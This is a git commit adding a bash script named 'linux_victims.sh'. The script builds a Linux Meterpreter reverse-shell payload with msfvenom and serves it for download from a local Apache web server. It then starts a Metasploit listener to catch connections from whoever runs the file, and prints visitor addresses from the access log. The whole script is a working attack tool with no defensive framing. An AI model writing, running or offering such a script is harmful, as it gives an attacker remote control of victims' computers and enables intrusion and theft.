2d13bf4fe4d75466b242a9064118f9e9bf4aa166
810810810 <108226535+810810810@users.noreply.github.com>
2023-02-26 20:30:18 +0000

    Create linux_victims.sh

---
+++ linux_victims.sh
@@ -0,0 +1,42 @@
+#!/bin/bash
+
+# Set the local IP address
+LOCAL_IP=$(hostname -I | awk '{print $1}')
+
+# Set the payload name
+PAYLOAD_NAME="payload_$(date +%s).elf"
+
+# Set the Metasploit options
+LHOST=$LOCAL_IP
+LPORT=11506
+
+# Define the start_server function
+start_server() {
+  echo "Web server started at http://$LOCAL_IP/"
+  echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
+
+  # Start Apache web server
+  sudo systemctl start httpd
+
+  # Continuously print the access log to the terminal
+  echo "Visitors:"
+  sudo tail -f /var/log/httpd/access_log | awk '{print $1}'
+}
+
+# Generate the payload using msfvenom
+echo "Generating payload..."
+sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "/var/www/html/downloads/$PAYLOAD_NAME"
+
+# Set the file permissions for the payload
+echo "Setting file permissions..."
+sudo chmod 644 "/var/www/html/downloads/$PAYLOAD_NAME"
+
+# Start the Metasploit listener
+echo "Starting Metasploit listener..."
+gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
+
+# Start the web server and print the access log to the terminal
+start_server
+
+# Stop the web server and Metasploit listener when the script is terminated
+trap 'echo "Stopping web server and Metasploit listener..."; sudo systemctl stop httpd; exit' SIGINT
